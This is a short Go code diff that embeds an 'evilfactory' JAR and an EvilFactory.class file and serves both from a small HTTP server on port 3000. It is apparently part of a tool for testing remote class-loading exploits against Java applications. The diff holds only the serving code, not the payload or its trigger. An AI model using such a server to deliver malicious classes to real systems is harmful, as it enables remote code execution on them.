@@ -20,7 +20,9 @@ import (
 )
 
 //go:embed evilfactory-1.0-SNAPSHOT.jar
-var jar embed.FS
+var evil_jar embed.FS
+//go:embed EvilFactory.class
+var evil_class embed.FS
 
 var publicHost string
 
@@ -152,10 +154,13 @@ func RequestLogger(targetMux http.Handler) http.Handler {
 }
 
 func startHttpServer() {
-	var staticFS = http.FS(jar)
-	fs := http.FileServer(staticFS)
+
+	fs_jar := http.FileServer(http.FS(evil_jar))
+	fs_class := http.FileServer(http.FS(evil_class))
+
 	mux := http.NewServeMux()
-	mux.Handle("/evilfactory-1.0-SNAPSHOT.jar", fs)
+	mux.Handle("/evilfactory-1.0-SNAPSHOT.jar", fs_jar)
+	mux.Handle("/EvilFactory.class", fs_class)
 	mux.HandleFunc("/", handleIndex)
 	go func() {
 		err := http.ListenAndServe(":3000", RequestLogger(mux))
